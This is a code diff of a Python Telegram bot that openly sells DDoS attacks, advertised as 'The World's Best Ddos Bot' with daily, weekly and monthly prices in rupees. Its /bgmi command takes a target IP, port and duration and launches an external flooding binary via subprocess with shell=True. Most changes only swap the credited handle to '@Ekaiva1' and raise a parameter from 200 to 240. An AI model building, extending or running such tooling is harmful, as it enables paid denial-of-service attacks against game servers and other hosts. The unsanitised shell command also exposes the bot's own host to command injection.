@@ -242,13 +242,13 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 200"
+                full_command = f"./bgmi {target} {port} {time} 240"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
-            response = "Usage :- /bgmi <target> <port> <time>\nBy Indian Watchdogs @Indian_Hackers_Team"  # Updated command syntax
+            response = "Usage :- /bgmi <target> <port> <time>\nBy @Ekaiva1"  # Updated command syntax
     else:
-        response = "You Are Not Authorized To Use This Command.\nBy Indian Watchdogs @Indian_Hackers_Team"
+        response = "You Are Not Authorized To Use This Command.\nBy @Ekaiva1"
 
     bot.reply_to(message, response)
 
@@ -285,7 +285,7 @@ def show_help(message):
 
  To See Admin Commands:
  /admincmd : Shows All Admin Commands.
- By Indian Watchdogs @Indian_Hackers_Team
+ By Indian Watchdogs @Ekaiva1
 '''
     for handler in bot.message_handlers:
         if hasattr(handler, 'commands'):
@@ -300,7 +300,7 @@ def show_help(message):
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
     user_name = message.from_user.first_name
-    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy Indian Watchdogs @Indian_Hackers_Team"
+    response = f"Welcome to Your Home, {user_name}! Feel Free to Explore.\nTry To Run This Command : /help\nWelcome To The World's Best Ddos Bot\nBy @Ekaiva1"
     bot.reply_to(message, response)
 
 
@@ -329,7 +329,7 @@ Pr-ice List:
 Day-->150 Rs
 Week-->900 Rs
 Month-->1600 Rs
-By Indian Watchdogs @Ekauva1
+By  @Ekaiva1
 '''
     bot.reply_to(message, response)
 
@@ -344,7 +344,7 @@ def welcome_plan(message):
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
-By Indian Watchdogs @Indian_Hackers_Team
+By Indian Watchdogs @Ekaiva1
 '''
     bot.reply_to(message, response)
 
